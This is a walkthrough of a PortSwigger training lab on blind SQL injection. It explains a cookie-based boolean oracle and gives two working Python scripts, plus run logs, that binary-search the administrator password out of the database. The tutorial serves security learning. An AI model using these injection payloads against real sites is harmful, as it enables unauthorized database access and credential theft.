# Blind SQL Injection with Conditional Responses — Complete Walkthrough

> **Lab:** PortSwigger Web Security Academy — *Blind SQL injection with conditional responses*
> **Topic:** extracting the `administrator` password via a boolean oracle + binary search
> **Result:** password recovered in **105 HTTP requests** (vs ~720 with naive brute force)

---

## 1. Lab Summary

The application:

1. Reads a `TrackingId` cookie and uses its value **directly inside a SQL query** (no sanitization).
2. Returns **no query results** and **no error messages** (hence *blind*).
3. Prints a **`Welcome back`** message in the page **if and only if the query returned at least one row**.
4. The database contains a `users` table with `username` and `password` columns.

**Goal:** find the `administrator` password, then log in as that user to solve the lab.

---

## 2. The Oracle — Turning a Page Message into True/False

### 2.1 Normal behavior

Every page load sends:

```
Cookie: TrackingId=LaaXQtao013x2QkA; session=...
```

The server builds:

```sql
SELECT ... FROM tracking_table WHERE tracking_id = 'LaaXQtao013x2QkA'
```

Since `'LaaXQtao013x2QkA'` exists in the table → the query returns a row → the page shows **"Welcome back"**.

### 2.2 The injection primitive

Now poison the cookie:

```
TrackingId=LaaXQtao013x2QkA' AND 1=1-- 
```

The server now builds:

```sql
SELECT ... FROM tracking_table
WHERE tracking_id = 'LaaXQtao013x2QkA' AND 1=1-- '
```

| Piece | Purpose |
|---|---|
| `LaaXQtao013x2QkA'` | The `'` **closes the string literal** the server opened. Everything after it is *our SQL*. |
| `AND 1=1` | The injected condition. |
| `-- ` | SQL comment — everything after it (including the closing quote the server appends) is **ignored**. The **trailing space after `--` is required by MySQL**. |

- Condition **true** → row found → **"Welcome back" appears** → oracle = `TRUE`
- Condition **false** (e.g. `AND 1=2`) → 0 rows → **no message** → oracle = `FALSE`

> ⚠️ **The TrackingId must be a *real* id that exists in the table.** The injected condition is `AND`-ed onto the lookup of that id. A fake id would return 0 rows even when the condition is true, and the oracle would be stuck at FALSE forever.

From this point on we can ask the database **any yes/no question** and read the answer from the page. That single bit per request is all we need.

---

## 3. Asking the Real Question: "What Is Character N of the Password?"

We cannot ask for the password directly (blind = no data comes back). But we can slice one character out and compare it:

```sql
SUBSTRING((SELECT password FROM users WHERE username='administrator'), 5, 1) > 'h'
```

- Inner query returns e.g. `'xsznpscfh6prem79llns'`
- `SUBSTRING(..., 5, 1)` cuts out position 5, length 1 → `'p'`
- `'p' > 'h'` → TRUE or FALSE

The full poisoned cookie for that question:

```
Cookie: TrackingId=LaaXQtao013x2QkA' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),5,1) > 'h'-- 
```

Page contains "Welcome back" ⟺ the comparison was TRUE.

---

## 4. Binary Search — Why Not Try Every Character?

The lab password alphabet is `0-9` + `a-z` = **36 characters**.

| Strategy | Requests per char | Total (20 chars) |
|---|---|---|
| Try each character (`= 'a'`, `= 'b'`, ...) | up to 36 | ~720 |
| **Binary search** (`> 'h'` halves the space each time) | **~5–6** (log₂ 36) | **105** ✅ |

The search space is the charset string with indexes:

```
index: 0..9          10..35
char:  0123456789    abcdefghijklmnopqrstuvwxyz
```

The algorithm keeps an inclusive range `[lo..hi]` of candidate indexes and asks one halving question per request:

- `char > charset[mid]` is **TRUE** → answer is in the **upper half** → `lo = mid + 1`
- **FALSE** → answer is **≤ mid** → `hi = mid`

> 🔑 **The comparison is strictly greater (`>`).** If the character *equals* the guess, the answer is FALSE and `hi = mid` — so the search converges exactly on the equal character without ever needing a separate `=` test.

---

## 5. The Original Script (Annotated)

```python
import requests

URL = "https://<lab-id>.web-security-academy.net/"
TRACKING_ID = "LaaXQtao013x2QkA"          # real tracking id (must exist in the DB!)
SESSION = "..."                            # your session cookie
PASSWORD_LEN = 20                          # lab passwords are 20 chars

charset = "0123456789abcdefghijklmnopqrstuvwxyz"
password = ""
requests.packages.urllib3.disable_warnings()

def oracle(position, condition):
    # Build the poisoned cookie: <real id>' AND <condition>-- <trailing space!>
    payload = (
        f"{TRACKING_ID}' AND SUBSTRING((SELECT password FROM users "
        f"WHERE username='administrator'),{position},1){condition}-- "
    )
    r = requests.get(
        URL,
        cookies={"TrackingId": payload, "session": SESSION},
        verify=False,
        proxies={"http": "http://127.0.0.1:8080",
                 "https": "http://127.0.0.1:8080"}   # watch in Burp; remove if unwanted
    )
    return "Welcome back" in r.text   # ← THE oracle: page message → True/False

for pos in range(1, PASSWORD_LEN + 1):
    lo, hi = 0, len(charset) - 1      # inclusive index bounds in the charset
    while lo < hi:
        mid = (lo + hi) // 2
        cond = f" > '{charset[mid]}'"
        if oracle(pos, cond):
            lo = mid + 1              # char is strictly greater → keep upper half
        else:
            hi = mid                  # char is ≤ mid → keep lower half
    password += charset[lo]
    print(f"[+] Pos {pos:2d} = '{charset[lo]}'   password so far: {password}")

print(f"[✔] DONE — administrator password: {password}")
```

### Flow

```
for each position 1..20:
    reset search space to the whole charset
    while the space has more than one candidate:
        ask: is char at this position > charset[midpoint] ?
        TRUE  → throw away the lower half
        FALSE → throw away the upper half
    the single remaining candidate IS the character
    append it to the password
```

---

## 6. Real Log Excerpts (Actual Run)

> The script was run with verbose logging. Two positions are shown in full — one landing on a **letter** (Position 1 → `'x'`), one landing on a **digit** (Position 10 → `'6'`).

### 6.1 Position 1 — converges on `'x'` (charset index 33)

```
▶ POSITION 1
  start: char could be any charset index in [0..35]  i.e. '0'..'z'

  ── step 1: lo=0 hi=35 → mid=17 → question: is char at pos 1  >  'h' ?
  │  Cookie: TrackingId=LaaXQtao013x2QkA' AND SUBSTRING(...,1,1) > 'h'-- 
  │  'Welcome back' in page? True   → lo = 18        range [18..35]

  ── step 2: lo=18 hi=35 → mid=26 → question: is char at pos 1  >  'q' ?
  │  'Welcome back' in page? True   → lo = 27        range [27..35]

  ── step 3: lo=27 hi=35 → mid=31 → question: is char at pos 1  >  'v' ?
  │  'Welcome back' in page? True   → lo = 32        range [32..35]

  ── step 4: lo=32 hi=35 → mid=33 → question: is char at pos 1  >  'x' ?
  │  'Welcome back' in page? False  → hi = 33        range [32..33]

  ── step 5: lo=32 hi=33 → mid=32 → question: is char at pos 1  >  'w' ?
  │  'Welcome back' in page? True   → lo = 33        range [33..33]  → converged!

[+] Pos  1 = 'x'   password so far: x
```

Reading the trace: `'x' > 'h'`, `> 'q'`, `> 'v'` are all TRUE (upper halves kept), `> 'x'` is FALSE (equal!), `> 'w'` is TRUE → the only index left is 33 = `'x'`.

### 6.2 Position 10 — converges on `'6'` (charset index 6, a digit)

```
▶ POSITION 10
  start: char could be any charset index in [0..35]  i.e. '0'..'z'

  ── step 1: lo=0 hi=35 → mid=17 → question: is char at pos 10  >  'h' ?
  │  'Welcome back' in page? False  → hi = 17        range [0..17]

  ── step 2: lo=0 hi=17 → mid=8  → question: is char at pos 10  >  '8' ?
  │  'Welcome back' in page? False  → hi = 8         range [0..8]

  ── step 3: lo=0 hi=8  → mid=4  → question: is char at pos 10  >  '4' ?
  │  'Welcome back' in page? True   → lo = 5         range [5..8]

  ── step 4: lo=5 hi=8  → mid=6  → question: is char at pos 10  >  '6' ?
  │  'Welcome back' in page? False  → hi = 6         range [5..6]   ← equality trap: '6' > '6' is FALSE

  ── step 5: lo=5 hi=6  → mid=5  → question: is char at pos 10  >  '5' ?
  │  'Welcome back' in page? True   → lo = 6         range [6..6]  → converged!

[+] Pos 10 = '6'   password so far: xsznpscfh6
```

The **equality trap** at step 4 is the key detail: when the character equals the guess, `>` returns FALSE and `hi = mid` shrinks the range exactly onto the answer.

### 6.3 Final result

```
[+] Pos 20 = 's'   password so far: xsznpscfh6prem79llns
════════════════════════════════════════════════════════
[✔] DONE — administrator password: xsznpscfh6prem79llns
[i] Total HTTP requests sent: 105
```

Log in at `/login` with `administrator` / `xsznpscfh6prem79llns` to solve the lab.

---

## 7. Limits of the Original Approach

| Assumption | What if it is wrong? |
|---|---|
| Password length is 20 | Length may be unknown → ask the DB with `LENGTH()` |
| Charset is only `0-9a-z` | Password may contain **any keyboard character**: uppercase, symbols, space, even quotes |
| Compared character is embedded in the payload | A password containing `'` would produce `> '''` → **broken SQL**, oracle silently fails |

### 7.1 Unknown length

`LENGTH()` is just another yes/no question — binary-search it over `1..64`:

```sql
(SELECT LENGTH(password) FROM users WHERE username='administrator') > 30
```

### 7.2 Any keyboard character → compare ASCII numbers, not characters

Instead of `SUBSTRING(...) > 'x'`, ask:

```sql
ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'), 5, 1)) > 72
```

- `ASCII()` returns the character's **numeric code**: space=32, `!`=33, `3`=51, `A`=65, `a`=97, `~`=126.
- Binary search the number in the range **32–126** (every printable keyboard character).
- The payload now contains **only digits and function names** — the password character is *never* embedded in the query, so quotes/symbols/backslashes in the password **cannot break anything**.
- Cost: ~7 requests per character (log₂ 95 ≈ 6.6) instead of ~6 — negligible for full coverage.

---

## 8. Upgraded Script — Any Length + Any Character

```python
import requests

# ─── CONFIG ───
URL = "https://<lab-id>.web-security-academy.net/"
TRACKING_ID = "LaaXQtao013x2QkA"     # real tracking id (must exist in the DB)
SESSION = "..."                       # your session cookie
# no PASSWORD_LEN, no charset string needed!
# ───────────────

requests.packages.urllib3.disable_warnings()

PROXIES = {"http": "http://127.0.0.1:8080",
           "https": "http://127.0.0.1:8080"}   # watch in Burp; set to None to disable

def oracle(condition):
    # One request. True = "Welcome back" in page  <=>  condition is TRUE
    payload = f"{TRACKING_ID}' AND {condition}-- "
    r = requests.get(
        URL,
        cookies={"TrackingId": payload, "session": SESSION},
        verify=False,
        proxies=PROXIES,
    )
    return "Welcome back" in r.text

PW = "(SELECT password FROM users WHERE username='administrator')"

# ── STEP 1: discover the password length (binary search 1..64) ──
print("[*] Discovering password length...")
lo, hi = 1, 64
while lo < hi:
    mid = (lo + hi) // 2
    if oracle(f"LENGTH({PW}) > {mid}"):
        lo = mid + 1
    else:
        hi = mid
pw_len = lo
print(f"[+] Password length = {pw_len}")

# ── STEP 2: per position, binary-search the ASCII code 32..126 ──
# 32=space  33='!' ... 57='9'  65='A' ... 90='Z'  97='a' ... 126='~'
print("[*] Extracting password characters...")
password = ""
for pos in range(1, pw_len + 1):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"ASCII(SUBSTRING({PW},{pos},1)) > {mid}"):
            lo = mid + 1          # code is greater → keep upper half
        else:
            hi = mid              # code is ≤ mid → keep lower half
    password += chr(lo)
    print(f"[+] Pos {pos:2d} = {chr(lo)!r}   password so far: {password}")

print(f"\n[✔] DONE — administrator password: {password}")
```

### Why this version is strictly better

| | Original | Upgraded |
|---|---|---|
| Password length | hardcoded 20 | **discovered** via `LENGTH()` |
| Charset | only `0-9a-z` | **all 95 printable keyboard chars** |
| Quotes/symbols in password | would **break the payload** | harmless — only numbers go into the query |
| Requests per char | ~6 | ~7 |

---

## 9. Tips & Gotchas

1. **`-- ` needs a trailing space** — MySQL requires whitespace (or a control char) after `--`, otherwise it is not treated as a comment and the query breaks.
2. **Use a real TrackingId** — the condition is `AND`-ed onto the lookup of that id; a non-existent id gives an always-FALSE oracle.
3. **Watch traffic in Burp** — every request in the script appears in HTTP history; send one to Repeater and flip `> 'h'` to `> 'a'` to watch "Welcome back" appear/disappear. This is the best way to internalize the oracle.
4. **Length cap** — if the length search pins exactly at 64, raise the cap (e.g. `1..128`) and rerun; the real password may be longer.
5. **Non-printable characters** — if many extracted chars land exactly on the range edges (32/126), the true characters may sit outside the printable range; widen the search to `0..255` (use `ORD()` instead of `ASCII()` for multibyte data). PortSwigger lab passwords are always printable ASCII.
6. **Solve the lab** — POST to `/login` as `administrator` with the recovered password (or just paste it into the login form).

---

## 10. Key Takeaways

- **Blind SQLi** leaks nothing but a single observable (here: presence of "Welcome back") — that observable is a *boolean oracle*.
- A boolean oracle + `SUBSTRING` + comparison + **binary search** extracts arbitrary text character-by-character in `O(len · log |charset|)` requests.
- Comparing **ASCII codes** instead of characters makes the attack robust against any password content (quotes, symbols, spaces).
- `LENGTH()` removes the need to guess the password size.
- The whole 20-char password took **105 requests** — brute-forcing character-by-character would have needed ~720.

---

*Notes for educational use. Only test on systems you own or are explicitly authorized to test.*
